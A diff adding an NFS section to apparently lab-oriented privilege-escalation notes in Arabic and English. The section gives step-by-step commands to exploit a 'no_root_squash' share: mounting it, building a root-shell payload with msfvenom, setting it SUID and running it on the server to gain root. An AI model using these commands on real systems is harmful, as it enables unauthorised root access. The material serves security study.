@@ -699,7 +699,67 @@ Used responsibly, this is a great example of **local privilege escalation** via 
 
 
 
+<details>
+  <summary>NFS</summary>
 
+
+# NFS (Network File System)
+
+### 16) NFS
+
+* عند مشاركه ملف عبر NFS، يمكن للمستخدمين عن بعد إنشاء ملفات على النظام المستضيف وعادة ما يتم تشغيل `root_squashing` لمنح الشخص `root`. يمن امتلاك الملفات على النظام المضيف لكن هنا تم تعطيل هذه الميزه ``هذا الlab``
+
+#### On the Server Machine
+
+* Check the NFS share configuration:
+    ```bash
+    cat /etc/exports
+    ```
+    * Look for `no_root_squash` in the output, output for example: `/tmp *(rw,no_root_squashing)`
+
+#### On the Client (Attacker) Machine
+
+1.  **Mount the share:**  ``على جهازى``
+    ```bash
+    sudo su     
+    mkdir /tmp/nfs
+    mount -o rw,vers=3 <server_ip>:/tmp /tmp/nfs  #عنوان الماششين او ال lab
+    ```
+    * يتم ربط ``/tmp/nfs`` فى kali بمجلد ``/tmp`` على الخام او الماشيين 
+    * أي ملف يتم إنشاؤه في `/tmp/nfs` على `kali` سيظهر مباشرة في `/tmp` على الخادم.
+    *  وبما أن `no_root_squash` مفعل فإن أي ملف ينشئه `root` على `kali` سيحمل ملكية `root` على الخادم (machine)
+    *  
+
+1.  **Create a malicious payload:** ``on my device``
+    ```bash
+    msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+    ```
+    * (إنشاء ملف خبيث ووضعه داخل `/tmp/nfs` والذي سيمكننا من عمل `shell` الذي سيعطينا صلاحيات `root` على الخادم)
+
+2.  **Make the payload SUID and executable:** ``on my device``
+    ```bash
+    chmod +xs /tmp/nfs/shell.elf
+    ```
+    * (إعطاء الملف الصلاحية اللازمة ليكون `SUID` وجعله قابل للتنفيذ)
+
+#### On the Server Machine
+
+* **Execute the payload:** ``on server``
+    ```bash
+    /tmp/shell.elf
+    ```
+    * (تشغيل الملف الخبيث على الخادم)
+
+* **Check your identity:**
+    ```bash
+    whoami
+    ```
+    * `root`
+    * (مبروك)
+
+
+  
+</details>
 
 
 
